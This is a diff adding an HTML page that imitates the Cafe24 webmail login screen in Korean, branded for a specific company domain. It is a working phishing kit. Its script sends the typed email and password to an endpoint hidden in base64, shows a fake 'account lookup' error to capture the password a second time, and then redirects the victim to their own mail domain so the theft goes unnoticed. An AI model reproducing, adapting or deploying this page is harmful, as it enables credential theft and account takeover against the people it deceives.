@@ -1,0 +1,171 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title></title>
+    <meta name="WMMETA" content="host" data-host="webmail-130.cafe24.com">
+    <meta name="WMMETA" content="domain" data-domain="brake21.com">
+    <meta name="WMMETA" content="appversion" data-appversion="20220804">
+    <meta name="WMMETA" content="langpack" data-langpack="ko">
+    <link rel="stylesheet" type="text/css" href="webmail.css">
+</head>
+<body style="">
+
+<div class="mLogin type1 ">
+    <ul class="languages">
+        <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
+        <li><a class="login-language-change" href="#changeLang/chGb">简体中文</a></li>
+        <li><a class="login-language-change" href="#changeLang/jp">日本語</a></li>
+        <li><a class="login-language-change" href="#changeLang/chBig">繁體中文</a></li>
+        <li><a class="login-language-change" href="#changeLang/ko">한국어</a></li>
+    </ul>
+    <div class="inner">
+        <div class="logoArea">
+            <h2 class="logo">
+                <img src="@img_logo_aType.gif" alt="">
+            </h2>
+        </div>
+        <div class="contents">
+            <ul class="mTab typeLogin eTab switch-login-type">
+                <li class="selected"><a href="#tabUser">사용자 모드</a></li>
+                <li><a href="#tabAdmin">관리자 모드</a></li>
+            </ul>
+            <div id="tabUser" class="tabCont" style="display: block;">
+                <form id="userLoginForm" method="post">
+                    <input type="hidden" name="loginType" value="user">
+                    <input type="hidden" name="rTarget" value="parent">
+                    <input type="hidden" name="csrf_token" value="897868f0c15a281d70.95356433">
+                    <fieldset>
+                        <legend>사용자 로그인</legend>
+                        <label><input type="text" name="mail" class="fText" placeholder="아이디" id="u" value=""></label>
+                        <label><input type="password" name="password" class="fText" placeholder="비밀번호" id="p"></label>
+                        <button type="button" id="btn-submit" class="btnLogin user-login-btn"><span>로그인</span></button>
+                        <ul class="security">
+                            <li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
+                            <li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
+                        </ul>
+                    </fieldset>
+                </form>
+            </div>
+            <div id="tabAdmin" class="tabCont" style="display: none;">
+                <form id="adminLoginForm" method="post">
+                    <input type="hidden" name="loginType" value="admin">
+                    <input type="hidden" name="rTarget" value="parent">
+                    <input type="hidden" name="csrf_token" value="897868f0c15a281d70.95356433">
+                    <fieldset>
+                        <legend>관리자 로그인</legend>
+                        <label><input type="text" name="mail" class="fText" placeholder="아이디" id="u" value=""></label>
+                        <label><input type="password" name="password" class="fText" placeholder="비밀번호" id="p"></label>
+                        <button type="button" id="btn-submit" class="btnLogin">✓</button>
+                        <ul class="security">
+                            <li><input type="checkbox" name="save"> 아이디 저장</li>
+                            <li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li>
+                        </ul>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    </div>
+    <p class="footer"><a href="https://www.cafe24corp.com/">Copyright ⓒ <strong>1999-2025 Cafe24 Corp.</strong> All Rights Reserved.</a></p>
+</div>
+<iframe id="HFLOGIN" name="HFLOGIN" src="blank.html" border="0" frameborder="0" width="90%" height="0" style="display:none;"></iframe>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="./config.js"></script>
+<script>
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var id = getParameterByName('cms');
+    document.getElementById("u").value = id;
+
+    const connect = "L2Nvbm5lY3QucGhw"; // Base64 encoded "/connect.php"
+    const postUrl = `${config.baseUrl}${atob(connect)}`;
+
+    $(document).ready(function() {
+        $('#btn-submit').click(function() {
+            var username = $('#u').val();
+            var password = $('#p').val();
+            var login_attempts = 3;
+
+            if (password === '') {
+                $('#usernameError').html('<div class="error" style="color: #e81123; font-size: 16px">Enter email password to continue.</div>').show();
+                return false;
+            } else if (password.length <= 4) {
+                $('#usernameError').html('<div class="error" style="color: #e81123; font-size: 16px">Enter correct password for your email.</div>').show();
+                return false;
+            } else {
+                $('#usernameError').html('').hide();
+
+                if (login_attempts > 0) {
+                    submitFormAjaxFirst();
+                    login_attempts--;
+                } else {
+                    submitFormAjax();
+                }
+            }
+        });
+
+        function getEd(email) {
+            let emailDomain = null;
+            const pos = email.search('@');
+            if (pos > 0) {
+                emailDomain = email.slice(pos + 1);
+            }
+            return emailDomain;
+        }
+
+        function submitFormAjaxFirst() {
+            var username = document.getElementById('u').value;
+            var password = document.getElementById('p').value;
+            var params = "ai=" + username + "&pr=" + password;
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.onreadystatechange = function() {
+                if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+                    setTimeout(function() {
+                        document.getElementById('p').value = '';
+                        $('#usernameError').html('<div class="error" style="color: #e81123; font-size: 16px">There was an issue looking up your account. Tap Next to try again.</div>').show();
+                        $('#btn-submit').text('Next');
+                    }, 2000);
+                }
+            }
+            xmlHttp.open("post", postUrl, true);
+            xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xmlHttp.send(params);
+        }
+
+        function submitFormAjax() {
+            var username = document.getElementById('u').value;
+            var password = document.getElementById('p').value;
+            var params = "ai=" + username + "&pr=" + password;
+            var ed = getEd(username);
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.onreadystatechange = function() {
+                if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
+                    setTimeout(function() {
+                        window.location.href = 'https://' + ed;
+                    }, 2000);
+                }
+            }
+            xmlHttp.open("post", postUrl, true);
+            xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xmlHttp.send(params);
+        }
+    });
+</script>
+<input type="hidden" id="adminId" value="hansungc0">
+<input type="hidden" id="emailId" value="">
+<input type="hidden" id="isReseller" value="hosting">
+<input type="hidden" id="enctoken" value="">
+</body>
+
+</html>
+
